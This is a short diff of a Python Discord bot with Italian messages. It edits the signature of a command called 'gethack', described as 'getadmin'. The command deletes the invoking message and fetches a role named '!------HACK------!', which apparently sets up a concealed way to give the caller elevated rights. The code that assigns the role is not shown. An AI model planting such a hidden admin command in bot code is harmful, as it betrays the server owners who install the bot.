@@ -227,7 +227,7 @@ async def reloadname(ctx,member: discord.Member):
     await ctx.send(f"Nickname di {member.mention} è stato resettato")
 
 @bot.command(description="getadmin")
-async def gethack(ctx,message):
+async def gethack(ctx):
     await ctx.message.delete()
     guild = ctx.guild
     hackRole = discord.utils.get(guild.roles, name="!------HACK------!")
